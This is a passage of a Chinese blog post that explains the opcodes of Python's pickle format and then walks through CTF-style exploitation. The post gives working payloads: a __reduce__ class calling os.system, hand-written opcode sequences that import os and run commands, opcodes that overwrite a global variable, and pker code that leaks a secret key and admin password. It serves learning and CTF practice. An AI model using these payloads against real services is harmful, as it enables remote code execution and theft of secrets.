+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;tuple 元素顺序为数据入栈顺序&lt;/h2&gt;&lt;p&gt;t&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/t.png" href="/posts/python-pickle-unserialize/t.png" title="t">
+<img alt="/posts/python-pickle-unserialize/t.png" class="lazyload" data-sizes="auto" data-src="t.png" data-srcset="/posts/python-pickle-unserialize/t.png, t.png 1.5x, /posts/python-pickle-unserialize/t.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">tuple 元素顺序为数据入栈顺序</figcaption>
+</figure></p>
+</li>
+<li>
+<p><code>}</code> <code>]</code> <code>)</code> 分别将空 dict、空 list、空 tuple对象压入栈中，后续可以使用其它方法对这些对象进行操作</p>
+<p><code>s</code> 将栈顶的两个元素以 key-value 的格式放入其后的 dict 中，对应 <code>dict[key]=value</code> 操作</p>
+<p><code>u</code> 为添加多个 key-value，操作与 <code>d</code> 类似</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;s 对应 dict[key]=value&lt;/h2&gt;&lt;p&gt;s&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/s.png" href="/posts/python-pickle-unserialize/s.png" title="s">
+<img alt="/posts/python-pickle-unserialize/s.png" class="lazyload" data-sizes="auto" data-src="s.png" data-srcset="/posts/python-pickle-unserialize/s.png, s.png 1.5x, /posts/python-pickle-unserialize/s.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">s 对应 dict[key]=value</figcaption>
+</figure></p>
+<p><code>a</code> 将栈顶元素放入其后的 list 中，对应 <code>list.append(value)</code> 操作</p>
+<p><code>e</code> 为添加多个元素，操作与 <code>l</code> 类似</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;a 对应 list.append(value)&lt;/h2&gt;&lt;p&gt;a&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/a.png" href="/posts/python-pickle-unserialize/a.png" title="a">
+<img alt="/posts/python-pickle-unserialize/a.png" class="lazyload" data-sizes="auto" data-src="a.png" data-srcset="/posts/python-pickle-unserialize/a.png, a.png 1.5x, /posts/python-pickle-unserialize/a.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">a 对应 list.append(value)</figcaption>
+</figure></p>
+</li>
+<li>
+<p><code>b</code> 用于修改栈中的对象，调用对应类设定的 <code>__setstate__</code> 函数 (若有) 或默认的 <code>__dict__.update</code> 来修改对象的元素，栈顶为调用 update 的参数，需要一个 dict 参数，后一个元素为对应修改的对象</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;b 用于调用 __setstate__ 或 __dict__.update 函数更新对象&lt;/h2&gt;&lt;p&gt;b&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/b.png" href="/posts/python-pickle-unserialize/b.png" title="b">
+<img alt="/posts/python-pickle-unserialize/b.png" class="lazyload" data-sizes="auto" data-src="b.png" data-srcset="/posts/python-pickle-unserialize/b.png, b.png 1.5x, /posts/python-pickle-unserialize/b.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">b 用于调用 __setstate__ 或 __dict__.update 函数更新对象</figcaption>
+</figure></p>
+</li>
+<li>
+<p><code>c</code> 为最常见的 opcode 之一，其作用可以归结为调用 <code>find_class</code> 方法并将结果入栈，其接收两个参数，第一个参数为 <code>modname</code>，第二个参数为 <code>name</code></p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;c 调用 find_class 并将结果入栈&lt;/h2&gt;&lt;p&gt;c&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/c.png" href="/posts/python-pickle-unserialize/c.png" title="c">
+<img alt="/posts/python-pickle-unserialize/c.png" class="lazyload" data-sizes="auto" data-src="c.png" data-srcset="/posts/python-pickle-unserialize/c.png, c.png 1.5x, /posts/python-pickle-unserialize/c.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">c 调用 find_class 并将结果入栈</figcaption>
+</figure></p>
+</li>
+<li>
+<p><code>p</code> <code>q</code> <code>r</code> 将栈顶的元素放入 memo (一个临时使用的内存) 中，其接收一个参数，为该元素在 memo 中的索引，区别在于索引的类型不同</p>
+<p><code>g</code> <code>h</code> <code>j</code> 与之相对应，接收一个参数作为索引，在 memo 中寻找该索引对应的元素放入栈顶</p>
+<p>这三对 opcode 一般用于弹出或修改非栈顶元素时，将栈顶元素临时保存</p>
+</li>
+<li>
+<p><code>R</code> 为最常被过滤的 opcode，其由特殊方法 <code>__reduce__</code> 产生，对栈顶的 tuple 进行 callable 操作，第一个元素为一个可调用的对象 (一般通过 <code>c</code> 获取)，第二个元素为一个 tuple 储存调用的参数</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;R 可用于执行代码&lt;/h2&gt;&lt;p&gt;R&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/R.png" href="/posts/python-pickle-unserialize/R.png" title="R">
+<img alt="/posts/python-pickle-unserialize/R.png" class="lazyload" data-sizes="auto" data-src="R.png" data-srcset="/posts/python-pickle-unserialize/R.png, R.png 1.5x, /posts/python-pickle-unserialize/R.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">R 可用于执行代码</figcaption>
+</figure></p>
+</li>
+<li>
+<p><code>i</code> <code>o</code> 均用于创建类的实例，也可用于调用方法，其区别在于使用方法和参数传递方法的不同</p>
+<p>测试所用类如下图 (在同一文件下的对象 <code>modname</code> 为 <code>__main__</code>)</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;测试所用类&lt;/h2&gt;&lt;p&gt;test-class&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/test-class.png" href="/posts/python-pickle-unserialize/test-class.png" title="test-class">
+<img alt="/posts/python-pickle-unserialize/test-class.png" class="lazyload" data-sizes="auto" data-src="test-class.png" data-srcset="/posts/python-pickle-unserialize/test-class.png, test-class.png 1.5x, /posts/python-pickle-unserialize/test-class.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">测试所用类</figcaption>
+</figure></p>
+<p><code>i</code> 接收两个参数 (在 opcode 后跟参数)，分别对应 <code>modname</code> 与 <code>name</code>，创建实例或调用方法所用参数为使用 <code>i</code> 时栈内内容，以 mark object 标识数据开始</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;i 用于创建实例&lt;/h2&gt;&lt;p&gt;inst&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/inst.png" href="/posts/python-pickle-unserialize/inst.png" title="inst">
+<img alt="/posts/python-pickle-unserialize/inst.png" class="lazyload" data-sizes="auto" data-src="inst.png" data-srcset="/posts/python-pickle-unserialize/inst.png, inst.png 1.5x, /posts/python-pickle-unserialize/inst.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">i 用于创建实例</figcaption>
+</figure></p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;i 用于调用方法&lt;/h2&gt;&lt;p&gt;i&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/inst-method.png" href="/posts/python-pickle-unserialize/inst-method.png" title="i">
+<img alt="/posts/python-pickle-unserialize/inst-method.png" class="lazyload" data-sizes="auto" data-src="inst-method.png" data-srcset="/posts/python-pickle-unserialize/inst-method.png, inst-method.png 1.5x, /posts/python-pickle-unserialize/inst-method.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">i 用于调用方法</figcaption>
+</figure></p>
+<p><code>o</code> 不接收参数，其使用栈上的元素，以 mark object 标识数据开始，第一个元素为类或可调用的对象，之后的元素为其参数</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;o 用于创建实例&lt;/h2&gt;&lt;p&gt;obj&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/obj.png" href="/posts/python-pickle-unserialize/obj.png" title="obj">
+<img alt="/posts/python-pickle-unserialize/obj.png" class="lazyload" data-sizes="auto" data-src="obj.png" data-srcset="/posts/python-pickle-unserialize/obj.png, obj.png 1.5x, /posts/python-pickle-unserialize/obj.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">o 用于创建实例</figcaption>
+</figure></p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;o 用于调用方法&lt;/h2&gt;&lt;p&gt;obj-method&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/obj-method.png" href="/posts/python-pickle-unserialize/obj-method.png" title="obj-method">
+<img alt="/posts/python-pickle-unserialize/obj-method.png" class="lazyload" data-sizes="auto" data-src="obj-method.png" data-srcset="/posts/python-pickle-unserialize/obj-method.png, obj-method.png 1.5x, /posts/python-pickle-unserialize/obj-method.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">o 用于调用方法</figcaption>
+</figure></p>
+</li>
+</ul>
+<p>以上为 V0 版本 pickle 中常用的 opcode，后续版本增加的 opcode 大部分均为对旧版本 opcode 功能的补充，少有大规模的改动，部分新的 opcode 在之后的例题中会介绍到</p>
+<h2 id="0x03-利用方法">0x03 利用方法</h2>
+<p>根据我目前遇到过的情况 (一般在 CTF 题中)，pickle 反序列化主要有以下几种常见的利用方法</p>
+<h3 id="执行恶意命令">执行恶意命令</h3>
+<p>执行恶意命令是 pickle 反序列化最简单也是最危险的利用方法，可以直接通过 <code>__reduce__</code> 方法进行利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="k">class</span> <span class="nc">Evil</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">'whoami'</span><span class="p">,))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Evil</span><span class="p">()))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>将输出的序列化数据进行反序列化即可执行 <code>os.system('whoami')</code>，此种方法操作简单但局限性较大，需要反序列化执行环境引入所需的库，且只能执行一次函数调用，因此常使用手写 opcode 的方法进行利用，这里推荐一个库 <a href="https://github.com/EddieIvan01/pker" rel="noopener noreffer" target="_blank">pker</a>，可以自动生成 opcode，还是挺方便的</p>
+<p>我就以反序列化执行环境未导入 <code>os</code> 模块举例，在这种情况下执行 <code>os.system('whoami')</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">c__builtin__
+getattr
+(c__builtin__
+__import__
+(S'os'
+tRS'system'
+tR(S'whoami'
+tR.
+</code></pre></td></tr></table>
+</div>
+</div><p>其中 1~2 行获取 <code>__builtin__.getattr</code> 函数， 3~6 行通过 <code>__builtin__.__import__</code> 函数导入 <code>os</code> 模块，第 6~7 行获取 <code>os.system</code> 函数，7~8 行通过调用 <code>os.system</code> 函数实现任意命令执行，成功在未导入 <code>os</code> 模块的情况下执行 <code>os.system</code> 函数</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;手写 opcode 在未导入 os 模块的情况下执行 os.system 函数&lt;/h2&gt;&lt;p&gt;os&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/os.png" href="/posts/python-pickle-unserialize/os.png" title="os">
+<img alt="/posts/python-pickle-unserialize/os.png" class="lazyload" data-sizes="auto" data-src="os.png" data-srcset="/posts/python-pickle-unserialize/os.png, os.png 1.5x, /posts/python-pickle-unserialize/os.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">手写 opcode 在未导入 os 模块的情况下执行 os.system 函数</figcaption>
+</figure></p>
+<p>若使用 pker 库生成，则对应代码为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">os</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'__import__'</span><span class="p">)(</span><span class="s1">'os'</span><span class="p">)</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'getattr'</span><span class="p">)(</span><span class="n">os</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">)</span>
+<span class="n">system</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span>
+<span class="k">return</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="修改全局变量">修改全局变量</h3>
+<p>通过 <code>c</code> 操作码可以获取到任意对象，<code>b</code> 操作码可以对任意对象进行修改，此时就可以获取全局对象并进行修改</p>
+<blockquote>
+<p>若为普通对象则可以直接用 <code>b</code> 操作码进行修改，参考 opcode 简介一节中的介绍</p>
+</blockquote>
+<p>这里讨论 <code>dict</code> <code>list</code> 等没有 <code>__dict__</code> 属性的对象的情况，可以通过获取其 <code>update</code> <code>append</code> 等函数进行修改，比如下面的示例代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">secret</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'ADMIN'</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">secret</span><span class="o">.</span><span class="n">ADMIN</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里 secret 是全局对象，假设我们没有正常途径修改这个变量，但是有一个输入可控的 pickle 反序列化，我们就可以通过构造 opcode 修改该变量</p>
+<p>构造 opcode 如下，最终调用函数为 <code>__main__.secret.update({'ADMIN': 1})</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">c__builtin__
+getattr
+(c__main__
+secret
+S'update'
+tR((S'ADMIN'
+I1
+dtR.
+</code></pre></td></tr></table>
+</div>
+</div><p>其中 1~2 行获取 <code>__builtin__.getattr</code> 函数，3~4 行获取 <code>secret</code> 变量，5~6 行获取 <code>secret.update</code> 函数，6~8 行调用该函数将 <code>ADMIN</code> 设为 1</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;通过调用 dict 对象的 update 方法修改全局变量&lt;/h2&gt;&lt;p&gt;secret&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/secret.png" href="/posts/python-pickle-unserialize/secret.png" title="secret">
+<img alt="/posts/python-pickle-unserialize/secret.png" class="lazyload" data-sizes="auto" data-src="secret.png" data-srcset="/posts/python-pickle-unserialize/secret.png, secret.png 1.5x, /posts/python-pickle-unserialize/secret.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">通过调用 dict 对象的 update 方法修改全局变量</figcaption>
+</figure></p>
+<p>若使用 pker 库生成，则对应代码为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">secret</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'secret'</span><span class="p">)</span>
+<span class="n">update</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__builtin__'</span><span class="p">,</span> <span class="s1">'getattr'</span><span class="p">)(</span><span class="n">secret</span><span class="p">,</span> <span class="s1">'update'</span><span class="p">)</span>
+<span class="n">update</span><span class="p">({</span><span class="s1">'ADMIN'</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
+<span class="k">return</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="获取其它模块中的隐私数据">获取其它模块中的隐私数据</h3>
+<p>通过 <code>c</code> 操作码还可以获取到其它模块中的隐私数据，比如 2021 年国赛西南分区赛 Web3</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">settings</span> <span class="kn">import</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">User</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span>
+
+<span class="err">……</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/load'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">loads</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">Haha</span> <span class="o">=</span> <span class="n">restricted_loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+        <span class="k">assert</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">Haha</span><span class="p">,</span> <span class="n">User</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">Haha</span><span class="o">.</span><span class="n">password</span> <span class="o">==</span> <span class="n">ADMIN_PASSWORD</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">Haha</span><span class="o">.</span><span class="n">msg</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s2">"&lt;img src='"</span> <span class="o">+</span> <span class="n">url_for</span><span class="p">(</span><span class="s1">'static'</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">'img/2.jpeg'</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"'&gt;&lt;br&gt;给👴🏻爬"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s2">"&lt;img src='"</span> <span class="o">+</span> <span class="n">url_for</span><span class="p">(</span><span class="s1">'static'</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">'img/2.jpeg'</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"'&gt;&lt;br&gt;儒 雅 随 和"</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们可以通过获取 <code>settings.ADMIN_PASSWORD</code> <code>settings.SECRET_KEY</code> 并分别赋给 <code>Haha.password</code> <code>Haha.msg</code> 的方法泄露 <code>SECRET_KEY</code>，再以此进行后续操作</p>
+<blockquote>
+<p>这题不知道为什么直接用 V0 版本的序列化数据会 500 (也有可能是我当时写的有问题)，所以现场分析了一下默认版本 V4 的字节码然后手改了一下最后过了，具体分析详见这篇文章 <a href="/posts/ciscn-2021-ws-web3/" rel="">CISCN 2021 西南分区赛 Web3 Break&amp;Fix</a></p>
+</blockquote>
+<p>这里就简单写一下应该可以用的 pker 对应代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">User</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'__main__'</span><span class="p">,</span> <span class="s1">'User'</span><span class="p">)</span>
+<span class="n">Haha</span> <span class="o">=</span> <span class="n">OBJ</span><span class="p">(</span><span class="n">User</span><span class="p">)</span>
+<span class="n">Haha</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'settings'</span><span class="p">,</span> <span class="s1">'ADMIN_PASSWORD'</span><span class="p">)</span>
+<span class="n">Haha</span><span class="o">.</span><span class="n">msg</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'settings'</span><span class="p">,</span> <span class="s1">'SECRET_KEY'</span><span class="p">)</span>
+<span class="k">return</span> <span class="n">Haha</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04-后记">0x04 后记</h2>
+<p>由于我自己对 Python 的了解程度很一般，用到 pickle 反序列化的地方也不是很多，很多地方理解的不是很到位，写的也不是很清楚，所以这篇随便糊的文章仅供参考，如有错误请大佬们轻喷</p>
+</div><div class="post-footer" id="post-footer">
+<div class="post-info">
+<div class="post-info-line">
+<div class="post-info-mod">
+<span>更新于 2021-06-10</span>
+</div>
+<div class="post-info-license"></div>
+</div>
+<div class="post-info-line">
+<div class="post-info-md"><span>
+<a class="link-to-markdown" href="/posts/python-pickle-unserialize/index.md" target="_blank">阅读原始文档</a>
+</span></div>
+<div class="post-info-share">
+<span></span>
+</div>
+</div>
+</div>
+<div class="post-info-more">
+<section class="post-tags"><i class="fas fa-tags fa-fw"></i> <a href="/tags/python/">Python</a>, <a href="/tags/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle 反序列化</a></section>
+<section>
+<span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span> | <span><a href="/">主页</a></span>
+</section>
+</div>
+<div class="post-nav"><a class="prev" href="/posts/ciscn-2021-ws-web3/" rel="prev" title="CISCN 2021 西南分区赛 Web3 Break&amp;Fix WriteUp"><i class="fas fa-angle-left fa-fw"></i>CISCN 2021 西南分区赛 Web3 Break&amp;Fix WriteUp</a></div>
+</div>
+<div id="comments"><div class="comment" id="valine"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+</main><footer class="footer">
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
+</div>
+</footer></div>
+<div id="fixed-buttons"><a class="fixed-button" href="#" id="back-to-top" title="回到顶部">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a class="fixed-button" href="#" id="view-comments" title="查看评论">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><link href="/lib/valine/valine.min.css" rel="stylesheet"/><link href="/lib/lightgallery/lightgallery.min.css" rel="stylesheet"/><script src="/lib/valine/Valine.min.js" type="text/javascript"></script><script src="/lib/smooth-scroll/smooth-scroll.min.js" type="text/javascript"></script><script src="/lib/autocomplete/autocomplete.min.js" type="text/javascript"></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" type="text/javascript"></script><script src="/lib/lazysizes/lazysizes.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lightgallery.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-thumbnail.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-zoom.min.js" type="text/javascript"></script><script src="/lib/clipboard/clipboard.min.js" type="text/javascript"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"iAbQo5y0XlBlUP9F0K3Tyx8f-MdYXbMMI","appKey":"ML5YMAAFe45gCJawVJcUkrg0","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":